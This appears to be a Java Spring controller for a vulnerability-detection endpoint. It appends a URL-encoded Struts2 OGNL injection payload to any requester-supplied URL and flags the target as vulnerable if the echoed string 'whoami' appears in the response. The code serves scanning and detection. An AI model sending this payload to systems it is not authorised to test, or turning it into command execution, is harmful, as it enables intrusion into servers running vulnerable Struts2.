package com.cn.ctbri.controller;



import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.params.HttpMethodParams;
import org.apache.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;




@Controller
public class XController {
	//日志对象
	private Logger log = Logger.getLogger(this.getClass());
	
	/**
	 * 跳转到x专区页面
	 */
	@RequestMapping("/Xpage.html")
	public String viewXPage(Model model,HttpServletRequest reques){
	
		return "/source/page/Xpage/viewXPage";
	}
	/**
	 * 检测
	 */
	@RequestMapping("/detectionUrl.html")
	public void detectionUrl(HttpServletRequest request,HttpServletResponse response){


	   boolean flag=true;
	   try{
		String urlInfo = request.getParameter("urlInfo");
		String uriPage = urlInfo+"?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=whoami";
		 flag= this.GetDetection(uriPage);
		if(!flag){
			flag = this.PostDetection(uriPage);
			
		}
		response.setContentType("textml;charset=UTF-8");
		response.getWriter().print(flag);
	   }catch (Exception e) {
			e.printStackTrace();
		   
	   }
	}
	
	
	  public boolean PostDetection(String urlInfo) {
		  
			 boolean flag =false;
				try {
					log.info(urlInfo);
				
					HttpClient client= new HttpClient();
					PostMethod post=new PostMethod(urlInfo);
					//用于乱码
					post.getParams().setParameter(HttpMethodParams.HTTP_CONTENT_CHARSET,"utf-8"); 
					//提交执行
					int code=client.executeMethod(post);
					String body=null;
					//判断返回值是否成功
					if(code==HttpStatus.SC_OK){
						body=post.getResponseBodyAsString();
					}
				   if(code==200&&body!=null){
					  if(body.indexOf("whoami")!=-1){
						  flag= true;
						  log.info("发现漏洞");
						 
					  }	else{
						  flag=false;
						  log.info("无....");
					  }
					}
				} catch (Exception e) {
					e.printStackTrace();
					  log.info("访问地址无响应!");
					flag=false;
				} 
				return flag;
			}
			

			
			public boolean GetDetection(String urlInfo) {
				boolean flag=false;
				try{
				HttpClient client= new HttpClient();
				GetMethod gets = new GetMethod(urlInfo);
				int code=client.executeMethod(gets);
				String body=null;
				if(code==HttpStatus.SC_OK){
					body=gets.getResponseBodyAsString();
				}
				if(code==200&&body!=null){
					  if(body.indexOf("whoami")!=-1){
						  flag= true;
						  log.info("发现漏洞");
						
                     }else{
                    	  flag=false;
						  log.info("无....");
					  }	
				}
				}catch (Exception e) {
					e.printStackTrace();
					  log.info("访问地址无响应!");

					flag=false;
				} 
				return flag;
		    }
}
